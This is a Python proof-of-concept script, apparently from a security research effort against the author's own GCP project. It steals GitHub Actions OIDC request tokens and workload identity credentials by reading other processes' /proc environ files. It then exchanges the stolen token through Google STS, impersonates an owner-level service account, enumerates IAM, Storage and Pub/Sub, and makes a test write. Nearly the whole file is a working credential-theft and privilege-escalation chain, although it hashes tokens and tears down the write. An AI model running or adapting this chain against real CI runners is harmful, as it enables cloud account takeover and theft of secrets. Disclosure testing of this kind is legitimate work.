#!/usr/bin/env python3
"""W2-MCPCONF-OWNPROJECT-WIF-VERIFY — verifier credential-use proof (runs in spawned child; own infra).

Chain: parent environ (same-uid /proc) -> OIDC request env + exported WIF creds file ->
GitHub OIDC token -> STS token exchange -> iamcredentials.generateAccessToken ->
SA (roles/owner, own project) -> GCP API proofs (reads + bounded write, torn down inline).

Verifier adaptations vs finder payload: fresh pool/provider names, marker nonce, topic prefix
w2-vrfy-stolen-. Raw OIDC/federated/SA tokens NEVER written to disk; sha256+len+expiry only.
"""
import base64
import hashlib
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = "riftweldproject"
PROJECT_NUMBER = os.environ.get("WIF_PROJECT_NUMBER", "40714870083")
POOL = os.environ.get("WIF_POOL", "w2-wif-vrfy-p001")
SA_EMAIL = os.environ.get("WIF_SA", "automation-service@riftweldproject.iam.gserviceaccount.com")
SCOPE = "https://www.googleapis.com/auth/cloud-platform"
OUT = "/tmp/vrfy/raw"
INTEREST = ["GOOGLE_GHA_CREDS_PATH", "CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE",
            "GOOGLE_APPLICATION_CREDENTIALS", "ACTIONS_ID_TOKEN_REQUEST_URL",
            "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "GEMINI_API_KEY", "GITHUB_SHA",
            "RUNNER_TRACKING_ID", "WIF_PROJECT_NUMBER", "WIF_POOL", "WIF_PROVIDER",
            "WIF_SA", "WIF_AUDIENCE_OVERRIDE", "VERIFY_NONCE", "GITHUB_ENV"]


def sha(b):
    if isinstance(b, str):
        b = b.encode()
    return hashlib.sha256(b).hexdigest()


def now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def req(method, url, headers=None, body=None, form=None):
    h = dict(headers or {})
    data = None
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        h["Content-Type"] = "application/x-www-form-urlencoded"
    elif body is not None:
        data = json.dumps(body).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, str(e)


def write(name, obj):
    with open(f"{OUT}/{name}", "w") as fh:
        json.dump(obj, fh, indent=1, sort_keys=True)
        fh.write("\n")


def scan_ancestors():
    me = os.getuid()
    found = {}
    procs = []
    if not os.path.isdir("/proc"):
        return found, procs
    for pid in sorted(os.listdir("/proc")):
        if not pid.isdigit():
            continue
        try:
            st = os.stat(f"/proc/{pid}")
            if st.st_uid != me:
                continue
            raw = open(f"/proc/{pid}/environ", "rb").read().split(b"\0")
            d = {}
            for kv in raw:
                if b"=" in kv:
                    k, v = kv.split(b"=", 1)
                    d[k.decode(errors="replace")] = v.decode(errors="replace")
            interesting = [k for k in INTEREST if k in d]
            if "ACTIONS_ID_TOKEN_REQUEST_URL" in d or "GOOGLE_GHA_CREDS_PATH" in d:
                procs.append({"pid": pid, "comm": d.get("_", "?"), "interesting": interesting})
                for k in interesting:
                    if k not in found:
                        found[k] = d[k]
        except Exception:
            continue
    return found, procs


def mask_report(found):
    rep = {}
    for k, v in found.items():
        if "TOKEN" in k or k == "GEMINI_API_KEY":
            rep[k] = {"present": True, "sha256": sha(v), "len": len(v), "value": "REDACTED"}
        else:
            rep[k] = {"present": True, "value": v[:300], "sha256": sha(v)}
    return rep


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "mcp"
    os.makedirs(OUT, exist_ok=True)
    summary = {"mode": mode, "ts": now(), "lane": "W2-MCPCONF-OWNPROJECT-WIF-VERIFY",
               "verify_nonce": os.environ.get("VERIFY_NONCE", "unset"), "steps": {}}

    found, procs = scan_ancestors()
    write(f"ancestor-env-{mode}.json", {"masked_env": mask_report(found),
                                        "ancestor_procs_with_identity_env": procs})
    summary["steps"]["proc_scan"] = {"identity_env_found": sorted(
        [k for k in found if k in ("GOOGLE_GHA_CREDS_PATH", "ACTIONS_ID_TOKEN_REQUEST_URL",
                                   "CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE",
                                   "GOOGLE_APPLICATION_CREDENTIALS")]),
        "n_ancestor_procs": len(procs)}
    if "GOOGLE_GHA_CREDS_PATH" in found and os.path.exists(found["GOOGLE_GHA_CREDS_PATH"]):
        try:
            cf = json.load(open(found["GOOGLE_GHA_CREDS_PATH"]))
            write(f"creds-file-summary-{mode}.json", {
                "path": found["GOOGLE_GHA_CREDS_PATH"],
                "type": cf.get("type"), "audience": cf.get("audience"),
                "token_url": cf.get("token_url"),
                "service_account_impersonation_url": cf.get("service_account_impersonation_url"),
                "credential_source_keys": sorted((cf.get("credential_source") or {}).keys()),
                "universe_domain": cf.get("universe_domain")})
            summary["steps"]["creds_file"] = {"readable": True, "audience": cf.get("audience")}
            creds_aud = cf.get("audience")
        except Exception as e:
            creds_aud = None
            summary["steps"]["creds_file"] = {"readable": False, "error": str(e)[:200]}
    else:
        creds_aud = None
        summary["steps"]["creds_file"] = {"readable": False, "reason": "env-or-file-missing"}

    override = found.get("WIF_AUDIENCE_OVERRIDE") or os.environ.get("WIF_AUDIENCE_OVERRIDE") or ""
    audience = (override.strip() or creds_aud or
                f"//iam.googleapis.com/projects/{PROJECT_NUMBER}/locations/global/"
                f"workloadIdentityPools/{POOL}/providers/{os.environ.get('WIF_PROVIDER', 'gh-vrfy')}")
    summary["steps"]["audience"] = audience

    oidc_url = found.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    oidc_tok_req = found.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not oidc_url or not oidc_tok_req:
        summary["result"] = "NO-OIDC-ENV"
        write(f"summary-{mode}.json", summary)
        print("NO-OIDC-ENV")
        return 0

    st, body = req("GET", oidc_url + "&audience=" + urllib.parse.quote(audience, safe=""),
                   headers={"Authorization": f"bearer {oidc_tok_req}", "Accept": "application/json"})
    if st != 200:
        summary["steps"]["oidc"] = {"status": st, "body_head": body[:300]}
        summary["result"] = "OIDC-FETCH-FAIL"
        write(f"summary-{mode}.json", summary)
        print("OIDC-FETCH-FAIL")
        return 1
    oidc = json.loads(body)["value"]
    try:
        payload_b64 = oidc.split(".")[1]
        claims = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (-len(payload_b64) % 4)))
        claim_view = {k: claims.get(k) for k in ("aud", "iss", "repository", "repository_owner",
                                                 "ref", "event_name", "sub")}
    except Exception:
        claim_view = {}
    summary["steps"]["oidc"] = {"status": 200, "jwt_sha256": sha(oidc), "jwt_len": len(oidc),
                                "claims": claim_view}

    st, body = req("POST", "https://sts.googleapis.com/v1/token", form={
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "audience": audience, "scope": SCOPE,
        "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
        "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
        "subject_token": oidc})
    fed = None
    if st == 200:
        fed = json.loads(body)["access_token"]
        summary["steps"]["sts_exchange"] = {"status": 200, "federated_token_sha256": sha(fed),
                                            "federated_token_len": len(fed)}
    else:
        summary["steps"]["sts_exchange"] = {"status": st, "body_head": body[:400]}
        summary["result"] = "STS-DENIED"
        write(f"summary-{mode}.json", summary)
        print(f"STS-DENIED {st}")
        return 1

    st, body = req("POST", f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/"
                           f"{urllib.parse.quote(SA_EMAIL)}:generateAccessToken",
                   headers={"Authorization": f"Bearer {fed}"},
                   body={"scope": [SCOPE], "lifetime": "1200s"})
    if st != 200:
        summary["steps"]["impersonation"] = {"status": st, "body_head": body[:400]}
        summary["result"] = "IMPERSONATION-FAIL"
        write(f"summary-{mode}.json", summary)
        print(f"IMPERSONATION-FAIL {st}")
        return 1
    sa_tok = json.loads(body)["accessToken"]
    summary["steps"]["impersonation"] = {"status": 200, "sa": SA_EMAIL,
                                         "sa_token_sha256": sha(sa_tok), "sa_token_len": len(sa_tok),
                                         "expire_time": json.loads(body).get("expireTime")}

    H = {"Authorization": f"Bearer {sa_tok}"}

    st, body = req("GET", f"https://iam.googleapis.com/v1/projects/{PROJECT}/serviceAccounts", headers=H)
    try:
        accs = [a["email"] for a in json.loads(body).get("accounts", [])]
    except Exception:
        accs = []
    write(f"api-iam-list-{mode}.json", {"status": st, "sa_emails": accs, "body_head": body[:600]})
    summary["steps"]["iam_serviceAccounts_list"] = {"status": st, "count": len(accs), "emails": accs}

    st, body = req("GET", f"https://storage.googleapis.com/storage/v1/b?project={PROJECT}", headers=H)
    write(f"api-storage-list-{mode}.json", {"status": st, "body_head": body[:400]})
    summary["steps"]["storage_buckets_list"] = {"status": st}

    st, body = req("GET", f"https://pubsub.googleapis.com/v1/projects/{PROJECT}/topics", headers=H)
    write(f"api-pubsub-list-{mode}.json", {"status": st, "body_head": body[:400]})
    summary["steps"]["pubsub_topics_list"] = {"status": st}

    topic = f"w2-vrfy-stolen-{mode}-{int(time.time())}"
    url = f"https://pubsub.googleapis.com/v1/projects/{PROJECT}/topics/{topic}"
    st, body = req("PUT", url, headers=H, body={})
    w = {"create": {"status": st, "body_head": body[:300]}}
    if st == 200:
        st2, body2 = req("GET", url, headers=H)
        w["get"] = {"status": st2, "body_head": body2[:300]}
        st3, body3 = req("DELETE", url, headers=H)
        w["delete"] = {"status": st3, "body_head": body3[:300]}
    write(f"api-pubsub-write-{mode}.json", w)
    summary["steps"]["pubsub_write_proof"] = w
    summary["result"] = "WIF-CHAIN-OK" if st == 200 else "WRITE-FAIL"
    write(f"summary-{mode}.json", summary)
    print(summary["result"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
